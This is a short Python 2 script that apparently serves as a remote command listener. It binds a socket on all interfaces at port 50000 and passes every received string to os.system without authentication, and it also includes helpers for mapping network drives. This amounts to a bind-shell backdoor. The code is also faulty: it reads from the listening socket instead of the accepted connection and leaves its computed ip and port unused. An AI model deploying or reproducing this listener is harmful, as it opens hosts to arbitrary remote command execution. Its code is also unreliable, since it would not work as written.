# -*- coding: utf-8 -*-
import logging
import subprocess
import os
import socket
import random
import netuse


def map_drive(path):
    netuse.mapNetDrive(path)
   

def remove_drive(path):
    netuse.removeNetDrive(path)


def initiate(ip, port):
    server_socket = socket.socket()
    server_socket.bind((ip, port))
    server_socket.listen(1)
    (client_socket, client_address) = server_socket.accept()
    return server_socket


def handle_commands(command):
    logging.basicConfig(filename='msgs.txt', filemode='w', level=logging.DEBUG)
    logging.info(command)
    os.system(command)
    #print command.split(" ")
    #print subprocess.check_output([command.split(" ")])


def main():
    ip = '127.0.0.1' #raw_input("insert ip: ")
    port = random.randint(30000, 60000)
    server_socket = initiate('0.0.0.0', 50000)
    command = ''
    while command != 'exit':
        print os.getcwd() + ': ',
        command = server_socket.recv(1024)
        handle_commands(command)


if __name__ == '__main__':
    main()
